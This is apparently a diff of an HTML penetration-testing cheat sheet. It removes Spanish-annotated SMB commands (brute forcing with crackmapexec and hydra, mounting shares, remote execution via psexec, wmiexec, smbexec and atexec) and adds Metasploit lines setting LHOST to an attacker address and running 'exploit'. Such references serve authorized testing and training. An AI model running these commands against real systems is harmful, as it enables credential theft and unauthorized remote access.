+<pre><code>set LHOST attacker-ip</code>
+<button class="copy-btn" data-copy="set LHOST attacker-ip">COPY</button>
+</pre>
 
-<p>SMB brute force with CME</p>
-<p>Realiza fuerza bruta SMB con usuario y contraseña especificados.</p>
-<pre><code>crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p &lt;password&gt;</code></pre>
-
-<p>SMB brute force with Hydra</p>
-<p>Realiza fuerza bruta de credenciales SMB usando listas de usuarios y contraseñas.</p>
-<pre><code>hydra -V -f -L &lt;users&gt; -P &lt;passwords&gt; smb://&lt;IP&gt; -u -vV</code></pre>
-
-<h3>Mounting Shares</h3>
-
-<p>Mount SMB share locally</p>
-<p>Monta un recurso compartido SMB en el sistema local.</p>
-<pre><code>sudo mount -t cifs //&lt;IP&gt;/ /tmp/share</code></pre>
-
-<p>Mount SMB share with credentials</p>
-<p>Monta un recurso SMB especificando usuario y contraseña.</p>
-<pre><code>sudo mount -t cifs -o 'username=,password=' //&lt;IP&gt;/ /tmp/share</code></pre>
-
-<h3>Execute Remote Commands</h3>
-
-<p>PsExec remote execution</p>
-<p>Ejecuta comandos remotamente usando SMB.</p>
-<pre><code>psexec.py /:@&lt;IP&gt;</code></pre>
-
-<p>WMIExec remote execution</p>
-<p>Ejecución remota más sigilosa mediante WMI.</p>
-<pre><code>wmiexec.py /:@&lt;IP&gt;</code></pre>
-
-<p>SMBExec remote execution</p>
-<p>Ejecución de comandos mediante servicios SMB.</p>
-<pre><code>smbexec.py /:@&lt;IP&gt;</code></pre>
-
-<p>Atexec remote execution</p>
-<p>Ejecución remota usando tareas programadas.</p>
-<pre><code>atexec.py /:@&lt;IP&gt;</code></pre>
+<pre><code>exploit</code>
+<button class="copy-btn" data-copy="exploit">COPY</button>
+</pre>
 
 </div>
 
